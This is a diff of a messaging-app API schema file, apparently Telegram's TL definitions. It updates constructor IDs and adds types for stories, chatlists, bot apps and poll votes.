@@ -56191,12 +56467,13 @@ privacyValueDisallowAll#8b73e763 = PrivacyRule;
 privacyValueDisallowUsers#e4621141 users:Vector<long> = PrivacyRule;
 privacyValueAllowChatParticipants#6b134e8e chats:Vector<long> = PrivacyRule;
 privacyValueDisallowChatParticipants#41c87565 chats:Vector<long> = PrivacyRule;
+privacyValueAllowCloseFriends#f7e8d89b = PrivacyRule;
 account.privacyRules#50a04e45 rules:Vector<PrivacyRule> chats:Vector<Chat> users:Vector<User> = account.PrivacyRules;
 accountDaysTTL#b8d0afdf days:int = AccountDaysTTL;
 documentAttributeImageSize#6c37c15c w:int h:int = DocumentAttribute;
 documentAttributeAnimated#11b58939 = DocumentAttribute;
 documentAttributeSticker#6319d612 flags:# mask:flags.1?true alt:string stickerset:InputStickerSet mask_coords:flags.0?MaskCoords = DocumentAttribute;
-documentAttributeVideo#ef02ce6 flags:# round_message:flags.0?true supports_streaming:flags.1?true duration:int w:int h:int = DocumentAttribute;
+documentAttributeVideo#d38ff1c2 flags:# round_message:flags.0?true supports_streaming:flags.1?true nosound:flags.3?true duration:double w:int h:int preload_prefix_size:flags.2?int = DocumentAttribute;
 documentAttributeAudio#9852f9c6 flags:# voice:flags.10?true duration:int title:flags.0?string performer:flags.1?string waveform:flags.2?bytes = DocumentAttribute;
 documentAttributeFilename#15590068 file_name:string = DocumentAttribute;
 documentAttributeHasStickers#9801d2f7 = DocumentAttribute;
@@ -56211,7 +56488,7 @@ webPageEmpty#eb1477e8 id:long = WebPage;
 webPagePending#c586da1c id:long date:int = WebPage;
 webPage#e89c45b2 flags:# id:long url:string display_url:string hash:int type:flags.0?string site_name:flags.1?string title:flags.2?string description:flags.3?string photo:flags.4?Photo embed_url:flags.5?string embed_type:flags.5?string embed_width:flags.6?int embed_height:flags.6?int duration:flags.7?int author:flags.8?string document:flags.9?Document cached_page:flags.10?Page attributes:flags.12?Vector<WebPageAttribute> = WebPage;
 webPageNotModified#7311ca11 flags:# cached_page_views:flags.0?int = WebPage;
-authorization#ad01d61d flags:# current:flags.0?true official_app:flags.1?true password_pending:flags.2?true encrypted_requests_disabled:flags.3?true call_requests_disabled:flags.4?true hash:long device_model:string platform:string system_version:string api_id:int app_name:string app_version:string date_created:int date_active:int ip:string country:string region:string = Authorization;
+authorization#ad01d61d flags:# current:flags.0?true official_app:flags.1?true password_pending:flags.2?true encrypted_requests_disabled:flags.3?true call_requests_disabled:flags.4?true unconfirmed:flags.5?true hash:long device_model:string platform:string system_version:string api_id:int app_name:string app_version:string date_created:int date_active:int ip:string country:string region:string = Authorization;
 account.authorizations#4bff8ea0 authorization_ttl_days:int authorizations:Vector<Authorization> = account.Authorizations;
 account.password#957b50fb flags:# has_recovery:flags.0?true has_secure_values:flags.1?true has_password:flags.2?true current_algo:flags.2?PasswordKdfAlgo srp_B:flags.2?bytes srp_id:flags.2?long hint:flags.3?string email_unconfirmed_pattern:flags.4?string new_algo:PasswordKdfAlgo new_secure_algo:SecurePasswordKdfAlgo secure_random:bytes pending_reset_date:flags.5?int login_email_pattern:flags.6?string = account.Password;
 account.passwordSettings#9a5c33e5 flags:# email:flags.0?string secure_settings:flags.1?SecureSecretSettings = account.PasswordSettings;
@@ -56221,7 +56498,7 @@ receivedNotifyMessage#a384b779 id:int flags:int = ReceivedNotifyMessage;
 chatInviteExported#ab4a819 flags:# revoked:flags.0?true permanent:flags.5?true request_needed:flags.6?true link:string admin_id:long date:int start_date:flags.4?int expire_date:flags.1?int usage_limit:flags.2?int usage:flags.3?int requested:flags.7?int title:flags.8?string = ExportedChatInvite;
 chatInvitePublicJoinRequests#ed107ab7 = ExportedChatInvite;
 chatInviteAlready#5a686d7c chat:Chat = ChatInvite;
-chatInvite#300c44c1 flags:# channel:flags.0?true broadcast:flags.1?true public:flags.2?true megagroup:flags.3?true request_needed:flags.6?true title:string about:flags.5?string photo:Photo participants_count:int participants:flags.4?Vector<User> = ChatInvite;
+chatInvite#300c44c1 flags:# channel:flags.0?true broadcast:flags.1?true public:flags.2?true megagroup:flags.3?true request_needed:flags.6?true verified:flags.7?true scam:flags.8?true fake:flags.9?true title:string about:flags.5?string photo:Photo participants_count:int participants:flags.4?Vector<User> = ChatInvite;
 chatInvitePeek#61695cb0 chat:Chat expires:int = ChatInvite;
 inputStickerSetEmpty#ffb62b95 = InputStickerSet;
 inputStickerSetID#9de7a269 id:long access_hash:long = InputStickerSet;
@@ -56243,7 +56520,7 @@ keyboardButtonUrl#258aff05 text:string url:string = KeyboardButton;
 keyboardButtonCallback#35bbdb6b flags:# requires_password:flags.0?true text:string data:bytes = KeyboardButton;
 keyboardButtonRequestPhone#b16a6c29 text:string = KeyboardButton;
 keyboardButtonRequestGeoLocation#fc796b3f text:string = KeyboardButton;
-keyboardButtonSwitchInline#568a748 flags:# same_peer:flags.0?true text:string query:string = KeyboardButton;
+keyboardButtonSwitchInline#93b9fbb5 flags:# same_peer:flags.0?true text:string query:string peer_types:flags.1?Vector<InlineQueryPeerType> = KeyboardButton;
 keyboardButtonGame#50f41ccf text:string = KeyboardButton;
 keyboardButtonBuy#afd93fbb text:string = KeyboardButton;
 keyboardButtonUrlAuth#10b78d29 flags:# text:string fwd_text:flags.0?string url:string button_id:int = KeyboardButton;
@@ -56329,7 +56606,7 @@ botInlineMessageMediaContact#18d1cdc2 flags:# phone_number:string first_name:str
 botInlineMessageMediaInvoice#354a9b09 flags:# shipping_address_requested:flags.1?true test:flags.3?true title:string description:string photo:flags.0?WebDocument currency:string total_amount:long reply_markup:flags.2?ReplyMarkup = BotInlineMessage;
 botInlineResult#11965f3a flags:# id:string type:string title:flags.1?string description:flags.2?string url:flags.3?string thumb:flags.4?WebDocument content:flags.5?WebDocument send_message:BotInlineMessage = BotInlineResult;
 botInlineMediaResult#17db940b flags:# id:string type:string photo:flags.0?Photo document:flags.1?Document title:flags.2?string description:flags.3?string send_message:BotInlineMessage = BotInlineResult;
-messages.botResults#947ca848 flags:# gallery:flags.0?true query_id:long next_offset:flags.1?string switch_pm:flags.2?InlineBotSwitchPM results:Vector<BotInlineResult> cache_time:int users:Vector<User> = messages.BotResults;
+messages.botResults#e021f2f6 flags:# gallery:flags.0?true query_id:long next_offset:flags.1?string switch_pm:flags.2?InlineBotSwitchPM switch_webview:flags.3?InlineBotWebView results:Vector<BotInlineResult> cache_time:int users:Vector<User> = messages.BotResults;
 exportedMessageLink#5dab1af4 link:string html:string = ExportedMessageLink;
 messageFwdHeader#5f777dce flags:# imported:flags.7?true from_id:flags.0?Peer from_name:flags.5?string date:int channel_post:flags.2?int post_author:flags.3?string saved_from_peer:flags.4?Peer saved_from_msg_id:flags.4?int psa_type:flags.6?string = MessageFwdHeader;
 auth.codeTypeSms#72a3158c = auth.CodeType;
@@ -56342,7 +56619,7 @@ auth.sentCodeTypeSms#c000bba2 length:int = auth.SentCodeType;
 auth.sentCodeTypeCall#5353e5a7 length:int = auth.SentCodeType;
 auth.sentCodeTypeFlashCall#ab03c6d9 pattern:string = auth.SentCodeType;
 auth.sentCodeTypeMissedCall#82006484 prefix:string length:int = auth.SentCodeType;
-auth.sentCodeTypeEmailCode#5a159841 flags:# apple_signin_allowed:flags.0?true google_signin_allowed:flags.1?true email_pattern:string length:int next_phone_login_date:flags.2?int = auth.SentCodeType;
+auth.sentCodeTypeEmailCode#f450f59b flags:# apple_signin_allowed:flags.0?true google_signin_allowed:flags.1?true email_pattern:string length:int reset_available_period:flags.3?int reset_pending_date:flags.4?int = auth.SentCodeType;
 auth.sentCodeTypeSetUpEmailRequired#a5491dea flags:# apple_signin_allowed:flags.0?true google_signin_allowed:flags.1?true = auth.SentCodeType;
 auth.sentCodeTypeFragmentSms#d9565c39 url:string length:int = auth.SentCodeType;
 auth.sentCodeTypeFirebaseSms#e57b1432 flags:# nonce:flags.0?bytes receipt:flags.1?string push_timeout:flags.1?int length:int = auth.SentCodeType;
@@ -56437,7 +56714,7 @@ phoneCallDiscardReasonHangup#57adc690 = PhoneCallDiscardReason;
 phoneCallDiscardReasonBusy#faf7e8c9 = PhoneCallDiscardReason;
 dataJSON#7d748d04 data:string = DataJSON;
 labeledPrice#cb296bf8 label:string amount:long = LabeledPrice;
-invoice#3e85a91b flags:# test:flags.0?true name_requested:flags.1?true phone_requested:flags.2?true email_requested:flags.3?true shipping_address_requested:flags.4?true flexible:flags.5?true phone_to_provider:flags.6?true email_to_provider:flags.7?true recurring:flags.9?true currency:string prices:Vector<LabeledPrice> max_tip_amount:flags.8?long suggested_tip_amounts:flags.8?Vector<long> recurring_terms_url:flags.9?string = Invoice;
+invoice#5db95a15 flags:# test:flags.0?true name_requested:flags.1?true phone_requested:flags.2?true email_requested:flags.3?true shipping_address_requested:flags.4?true flexible:flags.5?true phone_to_provider:flags.6?true email_to_provider:flags.7?true recurring:flags.9?true currency:string prices:Vector<LabeledPrice> max_tip_amount:flags.8?long suggested_tip_amounts:flags.8?Vector<long> terms_url:flags.10?string = Invoice;
 paymentCharge#ea02c27e id:string provider_charge_id:string = PaymentCharge;
 postAddress#1e8caaeb street_line1:string street_line2:string city:string state:string country_iso2:string post_code:string = PostAddress;
 paymentRequestedInfo#909c3f94 flags:# name:flags.0?string phone:flags.1?string email:flags.2?string shipping_address:flags.3?PostAddress = PaymentRequestedInfo;
@@ -56461,7 +56738,7 @@ inputPaymentCredentialsApplePay#aa1c39f payment_data:DataJSON = InputPaymentCred
 inputPaymentCredentialsGooglePay#8ac32801 payment_token:DataJSON = InputPaymentCredentials;
 account.tmpPassword#db64fd34 tmp_password:bytes valid_until:int = account.TmpPassword;
 shippingOption#b6213cdf id:string title:string prices:Vector<LabeledPrice> = ShippingOption;
-inputStickerSetItem#ffa0a496 flags:# document:InputDocument emoji:string mask_coords:flags.0?MaskCoords = InputStickerSetItem;
+inputStickerSetItem#32da9e9c flags:# document:InputDocument emoji:string mask_coords:flags.0?MaskCoords keywords:flags.1?string = InputStickerSetItem;
 inputPhoneCall#1e36fded id:long access_hash:long = InputPhoneCall;
 phoneCallEmpty#5366c915 id:long = PhoneCall;
 phoneCallWaiting#c5226f17 flags:# video:flags.6?true id:long access_hash:long date:int admin_id:long participant_id:long protocol:PhoneCallProtocol receive_date:flags.0?int = PhoneCall;
@@ -56508,7 +56785,7 @@ channelAdminLogEventActionDiscardGroupCall#db9f9140 call:InputGroupCall = Channe
 channelAdminLogEventActionParticipantMute#f92424d2 participant:GroupCallParticipant = ChannelAdminLogEventAction;
 channelAdminLogEventActionParticipantUnmute#e64429c0 participant:GroupCallParticipant = ChannelAdminLogEventAction;
 channelAdminLogEventActionToggleGroupCallSetting#56d6a247 join_muted:Bool = ChannelAdminLogEventAction;
-channelAdminLogEventActionParticipantJoinByInvite#5cdada77 invite:ExportedChatInvite = ChannelAdminLogEventAction;
+channelAdminLogEventActionParticipantJoinByInvite#fe9fc158 flags:# via_chatlist:flags.0?true invite:ExportedChatInvite = ChannelAdminLogEventAction;
 channelAdminLogEventActionExportedInviteDelete#5a50fca4 invite:ExportedChatInvite = ChannelAdminLogEventAction;
 channelAdminLogEventActionExportedInviteRevoke#410a134e invite:ExportedChatInvite = ChannelAdminLogEventAction;
 channelAdminLogEventActionExportedInviteEdit#e90ebb59 prev_invite:ExportedChatInvite new_invite:ExportedChatInvite = ChannelAdminLogEventAction;
@@ -56628,10 +56905,10 @@ help.userInfo#1eb3758 message:string entities:Vector<MessageEntity> author:strin
 pollAnswer#6ca9c2e9 text:string option:bytes = PollAnswer;
 poll#86e18161 id:long flags:# closed:flags.0?true public_voters:flags.1?true multiple_choice:flags.2?true quiz:flags.3?true question:string answers:Vector<PollAnswer> close_period:flags.4?int close_date:flags.5?int = Poll;
 pollAnswerVoters#3b6ddad2 flags:# chosen:flags.0?true correct:flags.1?true option:bytes voters:int = PollAnswerVoters;
-pollResults#dcb82ea3 flags:# min:flags.0?true results:flags.1?Vector<PollAnswerVoters> total_voters:flags.2?int recent_voters:flags.3?Vector<long> solution:flags.4?string solution_entities:flags.4?Vector<MessageEntity> = PollResults;
+pollResults#7adf2420 flags:# min:flags.0?true results:flags.1?Vector<PollAnswerVoters> total_voters:flags.2?int recent_voters:flags.3?Vector<Peer> solution:flags.4?string solution_entities:flags.4?Vector<MessageEntity> = PollResults;
 chatOnlines#f041e250 onlines:int = ChatOnlines;
 statsURL#47a971e0 url:string = StatsURL;
-chatAdminRights#5fb224d5 flags:# change_info:flags.0?true post_messages:flags.1?true edit_messages:flags.2?true delete_messages:flags.3?true ban_users:flags.4?true invite_users:flags.5?true pin_messages:flags.7?true add_admins:flags.9?true anonymous:flags.10?true manage_call:flags.11?true other:flags.12?true manage_topics:flags.13?true = ChatAdminRights;
+chatAdminRights#5fb224d5 flags:# change_info:flags.0?true post_messages:flags.1?true edit_messages:flags.2?true delete_messages:flags.3?true ban_users:flags.4?true invite_users:flags.5?true pin_messages:flags.7?true add_admins:flags.9?true anonymous:flags.10?true manage_call:flags.11?true other:flags.12?true manage_topics:flags.13?true post_stories:flags.14?true edit_stories:flags.15?true delete_stories:flags.16?true = ChatAdminRights;
 chatBannedRights#9f120418 flags:# view_messages:flags.0?true send_messages:flags.1?true send_media:flags.2?true send_stickers:flags.3?true send_gifs:flags.4?true send_games:flags.5?true send_inline:flags.6?true embed_links:flags.7?true send_polls:flags.8?true change_info:flags.10?true invite_users:flags.15?true pin_messages:flags.17?true manage_topics:flags.18?true send_photos:flags.19?true send_videos:flags.20?true send_roundvideos:flags.21?true send_audios:flags.22?true send_voices:flags.23?true send_docs:flags.24?true send_plain:flags.25?true until_date:int = ChatBannedRights;
 inputWallPaper#e630b979 id:long access_hash:long = InputWallPaper;
 inputWallPaperSlug#72091c80 slug:string = InputWallPaper;
@@ -56640,7 +56917,7 @@ account.wallPapersNotModified#1c199183 = account.WallPapers;
 account.wallPapers#cdc3858c hash:long wallpapers:Vector<WallPaper> = account.WallPapers;
 codeSettings#ad253d78 flags:# allow_flashcall:flags.0?true current_number:flags.1?true allow_app_hash:flags.4?true allow_missed_call:flags.5?true allow_firebase:flags.7?true logout_tokens:flags.6?Vector<bytes> token:flags.8?string app_sandbox:flags.8?Bool = CodeSettings;
 wallPaperSettings#1dc1bca4 flags:# blur:flags.1?true motion:flags.2?true background_color:flags.0?int second_background_color:flags.4?int third_background_color:flags.5?int fourth_background_color:flags.6?int intensity:flags.3?int rotation:flags.4?int = WallPaperSettings;
-autoDownloadSettings#8efab953 flags:# disabled:flags.0?true video_preload_large:flags.1?true audio_preload_next:flags.2?true phonecalls_less_data:flags.3?true photo_size_max:int video_size_max:long file_size_max:long video_upload_maxbitrate:int = AutoDownloadSettings;
+autoDownloadSettings#baa57628 flags:# disabled:flags.0?true video_preload_large:flags.1?true audio_preload_next:flags.2?true phonecalls_less_data:flags.3?true stories_preload:flags.4?true photo_size_max:int video_size_max:long file_size_max:long video_upload_maxbitrate:int small_queue_active_operations_max:int large_queue_active_operations_max:int = AutoDownloadSettings;
 account.autoDownloadSettings#63cacf26 low:AutoDownloadSettings medium:AutoDownloadSettings high:AutoDownloadSettings = account.AutoDownloadSettings;
 emojiKeyword#d5b3b9f9 keyword:string emoticons:Vector<string> = EmojiKeyword;
 emojiKeywordDeleted#236df622 keyword:string emoticons:Vector<string> = EmojiKeyword;
@@ -56677,14 +56954,13 @@ baseThemeArctic#5b11125a = BaseTheme;
 inputThemeSettings#8fde504f flags:# message_colors_animated:flags.2?true base_theme:BaseTheme accent_color:int outbox_accent_color:flags.3?int message_colors:flags.0?Vector<int> wallpaper:flags.1?InputWallPaper wallpaper_settings:flags.1?WallPaperSettings = InputThemeSettings;
 themeSettings#fa58b6d4 flags:# message_colors_animated:flags.2?true base_theme:BaseTheme accent_color:int outbox_accent_color:flags.3?int message_colors:flags.0?Vector<int> wallpaper:flags.1?WallPaper = ThemeSettings;
 webPageAttributeTheme#54b56617 flags:# documents:flags.0?Vector<Document> settings:flags.1?ThemeSettings = WebPageAttribute;
-messageUserVote#34d247b4 user_id:long option:bytes date:int = MessageUserVote;
-messageUserVoteInputOption#3ca5b0ec user_id:long date:int = MessageUserVote;
-messageUserVoteMultiple#8a65e557 user_id:long options:Vector<bytes> date:int = MessageUserVote;
-messages.votesList#823f649 flags:# count:int votes:Vector<MessageUserVote> users:Vector<User> next_offset:flags.0?string = messages.VotesList;
+webPageAttributeStory#2e94c3e7 flags:# peer:Peer id:int story:flags.0?StoryItem = WebPageAttribute;
+messages.votesList#4899484e flags:# count:int votes:Vector<MessagePeerVote> chats:Vector<Chat> users:Vector<User> next_offset:flags.0?string = messages.VotesList;
 bankCardOpenUrl#f568028a url:string name:string = BankCardOpenUrl;
 payments.bankCardData#3e24e573 title:string open_urls:Vector<BankCardOpenUrl> = payments.BankCardData;
 dialogFilter#7438f7e8 flags:# contacts:flags.0?true non_contacts:flags.1?true groups:flags.2?true broadcasts:flags.3?true bots:flags.4?true exclude_muted:flags.11?true exclude_read:flags.12?true exclude_archived:flags.13?true id:int title:string emoticon:flags.25?string pinned_peers:Vector<InputPeer> include_peers:Vector<InputPeer> exclude_peers:Vector<InputPeer> = DialogFilter;
 dialogFilterDefault#363293ae = DialogFilter;
+dialogFilterChatlist#d64a04a8 flags:# has_my_invites:flags.26?true id:int title:string emoticon:flags.25?string pinned_peers:Vector<InputPeer> include_peers:Vector<InputPeer> = DialogFilter;
 dialogFilterSuggested#77744d4a filter:DialogFilter description:string = DialogFilterSuggested;
 statsDateRangeDays#b637edaf min_date:int max_date:int = StatsDateRangeDays;
 statsAbsValueAndPrev#cb43acde current:double previous:double = StatsAbsValueAndPrev;
@@ -56703,7 +56979,7 @@ statsGroupTopPoster#9d04af9b user_id:long messages:int avg_chars:int = StatsGrou
 statsGroupTopAdmin#d7584c87 user_id:long deleted:int kicked:int banned:int = StatsGroupTopAdmin;
 statsGroupTopInviter#535f779d user_id:long invitations:int = StatsGroupTopInviter;
 stats.megagroupStats#ef7ff916 period:StatsDateRangeDays members:StatsAbsValueAndPrev messages:StatsAbsValueAndPrev viewers:StatsAbsValueAndPrev posters:StatsAbsValueAndPrev growth_graph:StatsGraph members_graph:StatsGraph new_members_by_source_graph:StatsGraph languages_graph:StatsGraph messages_graph:StatsGraph actions_graph:StatsGraph top_hours_graph:StatsGraph weekdays_graph:StatsGraph top_posters:Vector<StatsGroupTopPoster> top_admins:Vector<StatsGroupTopAdmin> top_inviters:Vector<StatsGroupTopInviter> users:Vector<User> = stats.MegagroupStats;
-globalPrivacySettings#bea2f424 flags:# archive_and_mute_new_noncontact_peers:flags.0?Bool = GlobalPrivacySettings;
+globalPrivacySettings#734c4ccb flags:# archive_and_mute_new_noncontact_peers:flags.0?true keep_archived_unmuted:flags.1?true keep_archived_folders:flags.2?true = GlobalPrivacySettings;
 help.countryCode#4203c5ef flags:# country_code:string prefixes:flags.0?Vector<string> patterns:flags.1?Vector<string> = help.CountryCode;
 help.country#c3878e23 flags:# hidden:flags.0?true iso2:string default_name:string name:flags.1?string country_codes:Vector<help.CountryCode> = help.Country;
 help.countriesListNotModified#93cc1f32 = help.CountriesList;
@@ -56712,6 +56988,7 @@ messageViews#455b853d flags:# views:flags.0?int forwards:flags.1?int replies:fla
 messages.messageViews#b6c4f543 views:Vector<MessageViews> chats:Vector<Chat> users:Vector<User> = messages.MessageViews;
 messages.discussionMessage#a6341782 flags:# messages:Vector<Message> max_id:flags.0?int read_inbox_max_id:flags.1?int read_outbox_max_id:flags.2?int unread_count:int chats:Vector<Chat> users:Vector<User> = messages.DiscussionMessage;
 messageReplyHeader#a6d57763 flags:# reply_to_scheduled:flags.2?true forum_topic:flags.3?true reply_to_msg_id:int reply_to_peer_id:flags.0?Peer reply_to_top_id:flags.1?int = MessageReplyHeader;
+messageReplyStoryHeader#9c98bfc1 user_id:long story_id:int = MessageReplyHeader;
 messageReplies#83d60fc2 flags:# comments:flags.0?true replies:int replies_pts:int recent_repliers:flags.1?Vector<Peer> channel_id:flags.0?long max_id:flags.2?int read_max_id:flags.3?int = MessageReplies;
 peerBlocked#e8fd8014 peer_id:Peer date:int = PeerBlocked;
 stats.messageStats#8999f295 views_graph:StatsGraph = stats.MessageStats;
@@ -56726,10 +57003,11 @@ inlineQueryPeerTypePM#833c0fac = InlineQueryPeerType;
 inlineQueryPeerTypeChat#d766c50a = InlineQueryPeerType;
 inlineQueryPeerTypeMegagroup#5ec4be43 = InlineQueryPeerType;
 inlineQueryPeerTypeBroadcast#6334ee9a = InlineQueryPeerType;
+inlineQueryPeerTypeBotPM#e3b2d0c = InlineQueryPeerType;
 messages.historyImport#1662af0b id:long = messages.HistoryImport;
 messages.historyImportParsed#5e0fb7b9 flags:# pm:flags.0?true group:flags.1?true title:flags.2?string = messages.HistoryImportParsed;
 messages.affectedFoundMessages#ef8d3e6c pts:int pts_count:int offset:int messages:Vector<int> = messages.AffectedFoundMessages;
-chatInviteImporter#8c5adfd9 flags:# requested:flags.0?true user_id:long date:int about:flags.2?string approved_by:flags.1?long = ChatInviteImporter;
+chatInviteImporter#8c5adfd9 flags:# requested:flags.0?true via_chatlist:flags.3?true user_id:long date:int about:flags.2?string approved_by:flags.1?long = ChatInviteImporter;
 messages.exportedChatInvites#bdc62dcc count:int invites:Vector<ExportedChatInvite> users:Vector<User> = messages.ExportedChatInvites;
 messages.exportedChatInvite#1871be50 invite:ExportedChatInvite users:Vector<User> = messages.ExportedChatInvite;
 messages.exportedChatInviteReplaced#222600ef invite:ExportedChatInvite new_invite:ExportedChatInvite users:Vector<User> = messages.ExportedChatInvite;
@@ -56752,7 +57030,7 @@ botCommandScopePeerUser#a1321f3 peer:InputPeer user_id:InputUser = BotCommandSco
 account.resetPasswordFailedWait#e3779861 retry_date:int = account.ResetPasswordResult;
 account.resetPasswordRequestedWait#e9effc7d until_date:int = account.ResetPasswordResult;
 account.resetPasswordOk#e926d63e = account.ResetPasswordResult;
-sponsoredMessage#3a836df8 flags:# recommended:flags.5?true show_peer_photo:flags.6?true random_id:bytes from_id:flags.3?Peer chat_invite:flags.4?ChatInvite chat_invite_hash:flags.4?string channel_post:flags.2?int start_param:flags.0?string message:string entities:flags.1?Vector<MessageEntity> = SponsoredMessage;
+sponsoredMessage#daafff6b flags:# recommended:flags.5?true show_peer_photo:flags.6?true random_id:bytes from_id:flags.3?Peer chat_invite:flags.4?ChatInvite chat_invite_hash:flags.4?string channel_post:flags.2?int start_param:flags.0?string webpage:flags.9?SponsoredWebPage message:string entities:flags.1?Vector<MessageEntity> sponsor_info:flags.7?string additional_info:flags.8?string = SponsoredMessage;
 messages.sponsoredMessages#c9ee1d87 flags:# posts_between:flags.0?int messages:Vector<SponsoredMessage> chats:Vector<Chat> users:Vector<User> = messages.SponsoredMessages;
 messages.sponsoredMessagesEmpty#1839490f = messages.SponsoredMessages;
 searchResultsCalendarPeriod#c9b0539f date:int min_msg_id:int max_msg_id:int count:int = SearchResultsCalendarPeriod;
@@ -56769,13 +57047,13 @@ messages.messageReactionsList#31bd492d flags:# count:int reactions:Vector<Messag
 availableReaction#c077ec01 flags:# inactive:flags.0?true premium:flags.2?true reaction:string title:string static_icon:Document appear_animation:Document select_animation:Document activate_animation:Document effect_animation:Document around_animation:flags.1?Document center_icon:flags.1?Document = AvailableReaction;
 messages.availableReactionsNotModified#9f071957 = messages.AvailableReactions;
 messages.availableReactions#768e3aad hash:int reactions:Vector<AvailableReaction> = messages.AvailableReactions;
-messagePeerReaction#b156fe9c flags:# big:flags.0?true unread:flags.1?true peer_id:Peer reaction:Reaction = MessagePeerReaction;
+messagePeerReaction#8c79b63c flags:# big:flags.0?true unread:flags.1?true my:flags.2?true peer_id:Peer date:int reaction:Reaction = MessagePeerReaction;
 groupCallStreamChannel#80eb48af channel:int scale:int last_timestamp_ms:long = GroupCallStreamChannel;
 phone.groupCallStreamChannels#d0e482b2 channels:Vector<GroupCallStreamChannel> = phone.GroupCallStreamChannels;
 phone.groupCallStreamRtmpUrl#2dbf3432 url:string key:string = phone.GroupCallStreamRtmpUrl;
 attachMenuBotIconColor#4576f3f0 name:string color:int = AttachMenuBotIconColor;
 attachMenuBotIcon#b2a7386b flags:# name:string icon:Document colors:flags.0?Vector<AttachMenuBotIconColor> = AttachMenuBotIcon;
-attachMenuBot#c8aa2cd2 flags:# inactive:flags.0?true has_settings:flags.1?true request_write_access:flags.2?true bot_id:long short_name:string peer_types:Vector<AttachMenuPeerType> icons:Vector<AttachMenuBotIcon> = AttachMenuBot;
+attachMenuBot#d90d8dfe flags:# inactive:flags.0?true has_settings:flags.1?true request_write_access:flags.2?true show_in_attach_menu:flags.3?true show_in_side_menu:flags.4?true side_menu_disclaimer_needed:flags.5?true bot_id:long short_name:string peer_types:flags.3?Vector<AttachMenuPeerType> icons:Vector<AttachMenuBotIcon> = AttachMenuBot;
 attachMenuBotsNotModified#f1d88a5c = AttachMenuBots;
 attachMenuBots#3c4301c0 hash:long bots:Vector<AttachMenuBot> users:Vector<User> = AttachMenuBots;
 attachMenuBotsBot#93bf667f bot:AttachMenuBot users:Vector<User> = AttachMenuBotsBot;
@@ -56852,6 +57130,55 @@ messages.translateResult#33db32f8 result:Vector<TextWithEntities> = messages.Tra
 autoSaveSettings#c84834ce flags:# photos:flags.0?true videos:flags.1?true video_max_size:flags.2?long = AutoSaveSettings;
 autoSaveException#81602d47 peer:Peer settings:AutoSaveSettings = AutoSaveException;
 account.autoSaveSettings#4c3e069d users_settings:AutoSaveSettings chats_settings:AutoSaveSettings broadcasts_settings:AutoSaveSettings exceptions:Vector<AutoSaveException> chats:Vector<Chat> users:Vector<User> = account.AutoSaveSettings;
+help.appConfigNotModified#7cde641d = help.AppConfig;
+help.appConfig#dd18782e hash:int config:JSONValue = help.AppConfig;
+inputBotAppID#a920bd7a id:long access_hash:long = InputBotApp;
+inputBotAppShortName#908c0407 bot_id:InputUser short_name:string = InputBotApp;
+botAppNotModified#5da674b7 = BotApp;
+botApp#95fcd1d6 flags:# id:long access_hash:long short_name:string title:string description:string photo:Photo document:flags.0?Document hash:long = BotApp;
+messages.botApp#eb50adf5 flags:# inactive:flags.0?true request_write_access:flags.1?true has_settings:flags.2?true app:BotApp = messages.BotApp;
+appWebViewResultUrl#3c1b4f0d url:string = AppWebViewResult;
+inlineBotWebView#b57295d5 text:string url:string = InlineBotWebView;
+readParticipantDate#4a4ff172 user_id:long date:int = ReadParticipantDate;
+inputChatlistDialogFilter#f3e0da33 filter_id:int = InputChatlist;
+exportedChatlistInvite#c5181ac flags:# title:string url:string peers:Vector<Peer> = ExportedChatlistInvite;
+chatlists.exportedChatlistInvite#10e6e3a6 filter:DialogFilter invite:ExportedChatlistInvite = chatlists.ExportedChatlistInvite;
+chatlists.exportedInvites#10ab6dc7 invites:Vector<ExportedChatlistInvite> chats:Vector<Chat> users:Vector<User> = chatlists.ExportedInvites;
+chatlists.chatlistInviteAlready#fa87f659 filter_id:int missing_peers:Vector<Peer> already_peers:Vector<Peer> chats:Vector<Chat> users:Vector<User> = chatlists.ChatlistInvite;
+chatlists.chatlistInvite#1dcd839d flags:# title:string emoticon:flags.0?string peers:Vector<Peer> chats:Vector<Chat> users:Vector<User> = chatlists.ChatlistInvite;
+chatlists.chatlistUpdates#93bd878d missing_peers:Vector<Peer> chats:Vector<Chat> users:Vector<User> = chatlists.ChatlistUpdates;
+bots.botInfo#e8a775b0 name:string about:string description:string = bots.BotInfo;
+messagePeerVote#b6cc2d5c peer:Peer option:bytes date:int = MessagePeerVote;
+messagePeerVoteInputOption#74cda504 peer:Peer date:int = MessagePeerVote;
+messagePeerVoteMultiple#4628f6e6 peer:Peer options:Vector<bytes> date:int = MessagePeerVote;
+sponsoredWebPage#3db8ec63 flags:# url:string site_name:string photo:flags.0?Photo = SponsoredWebPage;
+storyViews#8d595cd6 flags:# has_viewers:flags.1?true views_count:int forwards_count:flags.2?int reactions:flags.3?Vector<ReactionCount> reactions_count:flags.4?int recent_viewers:flags.0?Vector<long> = StoryViews;
+storyItemDeleted#51e6ee4f id:int = StoryItem;
+storyItemSkipped#ffadc913 flags:# close_friends:flags.8?true id:int date:int expire_date:int = StoryItem;
+storyItem#44c457ce flags:# pinned:flags.5?true public:flags.7?true close_friends:flags.8?true min:flags.9?true noforwards:flags.10?true edited:flags.11?true contacts:flags.12?true selected_contacts:flags.13?true out:flags.16?true id:int date:int expire_date:int caption:flags.0?string entities:flags.1?Vector<MessageEntity> media:MessageMedia media_areas:flags.14?Vector<MediaArea> privacy:flags.2?Vector<PrivacyRule> views:flags.3?StoryViews sent_reaction:flags.15?Reaction = StoryItem;
+stories.allStoriesNotModified#1158fe3e flags:# state:string stealth_mode:StoriesStealthMode = stories.AllStories;
+stories.allStories#6efc5e81 flags:# has_more:flags.0?true count:int state:string peer_stories:Vector<PeerStories> chats:Vector<Chat> users:Vector<User> stealth_mode:StoriesStealthMode = stories.AllStories;
+stories.stories#5dd8c3c8 count:int stories:Vector<StoryItem> chats:Vector<Chat> users:Vector<User> = stories.Stories;
+storyView#b0bdeac5 flags:# blocked:flags.0?true blocked_my_stories_from:flags.1?true user_id:long date:int reaction:flags.2?Reaction = StoryView;
+stories.storyViewsList#46e9b9ec flags:# count:int reactions_count:int views:Vector<StoryView> users:Vector<User> next_offset:flags.0?string = stories.StoryViewsList;
+stories.storyViews#de9eed1d views:Vector<StoryViews> users:Vector<User> = stories.StoryViews;
+inputReplyToMessage#9c5386e4 flags:# reply_to_msg_id:int top_msg_id:flags.0?int = InputReplyTo;
+inputReplyToStory#15b0f283 user_id:InputUser story_id:int = InputReplyTo;
+exportedStoryLink#3fc9053b link:string = ExportedStoryLink;
+storiesStealthMode#712e27fd flags:# active_until_date:flags.0?int cooldown_until_date:flags.1?int = StoriesStealthMode;
